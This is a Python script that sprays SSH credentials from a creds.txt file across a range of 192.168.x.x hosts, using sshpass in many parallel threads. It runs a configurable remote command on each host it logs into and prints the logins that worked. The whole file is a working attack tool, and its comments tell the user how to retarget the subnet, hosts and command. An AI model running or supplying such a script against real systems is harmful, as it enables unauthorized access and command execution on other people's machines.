import subprocess
import sys
import threading
import ipaddress

def read_credentials_file(file_path):
    credentials_list = []

    try:
        with open(file_path, 'r') as file:
            for line in file:
                user, password = line.strip().split(',')
                credentials_list.append((user, password))
    except FileNotFoundError:
        print(f"File '{file_path}' not found.")
    except Exception as e:
        print("Error:", e)

    return credentials_list

successful_login = []
threads = []

def ssh_connect(creds, subnet, endpoints, command):
    for cred in creds:
        for endpoint in endpoints:
            # CHANGE THIS TO FIT THE SUBNET
            ipString = f"192.168.{subnet}.{endpoint}"
            try:
                ssh_command = f"sshpass -p '{cred[1]}' ssh {cred[0]}@{ipString} '{command}'"
                process = subprocess.Popen(ssh_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, stderr = process.communicate()
                if process.returncode == 0:
                    print(f"*****Succesful login with {cred[0]}:{cred[1]} on {ipString}*****")
                    successful_login.append([cred[0],cred[1],ipString])
                else:
                    print(f"not successful {cred[0]}:{cred[1]} on {ipString}")

            except Exception as e:
                print("Error:", e)

# ADD YOUR COMMAND HERE
command = 'ls -l'

creds = read_credentials_file("creds.txt") # FIX THIS in the format "USER,PASS" on each line

ips = [170, 108, 180, 116] # REPLACE THIS WITH THE LAST OCTET

for i in range(40): #CHANGE THIS TO MATCH SUBNET RANGE
    thread = threading.Thread(target=ssh_connect, args=(creds, i, ips, command))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()


print(successful_login)